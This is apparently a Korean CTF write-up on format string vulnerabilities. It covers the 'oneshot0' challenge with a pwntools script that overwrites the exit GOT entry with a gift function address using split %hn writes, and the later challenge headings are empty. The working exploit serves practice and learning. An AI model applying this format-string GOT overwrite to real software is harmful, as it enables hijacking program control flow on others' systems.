# fsb

## oneshot0

주어진 gift 함수를 실행하면 된다. PIE가 없고 partial RELRO이므로 fsb를 활용하여 exit 함수의 got를 gift함수의 주소로 덮어쓸 수 있다. gift 함수의 주소값이 크기 때문에 출력하는 것에 시간이 오래 걸리므로 %hn을 이용하여 2회에 걸쳐 나누어서 입력할 수 있다. gift의 주소를 2부분으로 나눈 뒤 각각 exit+2와 exit에 입력할 수 있다. payload의 길이는 8의 배수여야 하므로 0x20으로 설정하면 offset은 6이지만 payload 길이로 인해 실제 입력하는 offset은 10과 11이 된다. payload를 보내면 exit_got를 gift로 변조할 수 있다.

```python

from pwn import *

# context.log_level = 'debug'

e = ELF("./oneshot")
p = process(e.path)


p.recvuntil(b"\n\n")
payload = f'%{e.symbols["gift"] >> 16}c'.encode() #gift_high
payload += b"%10$hn"
payload += f"%{(e.symbols['gift'] & 0xffff) - (e.symbols['gift'] >> 16)}c".encode() #gift_low - gift_high
payload += b"%11$hn"
payload = payload.ljust(0x20, b"\x00")
payload += p64(e.got["exit"] + 2)
payload += p64(e.got["exit"])
p.send(payload)

p.interactive()


```


## oneshot1




## oneshot2




## oneshot3





## oneshot4
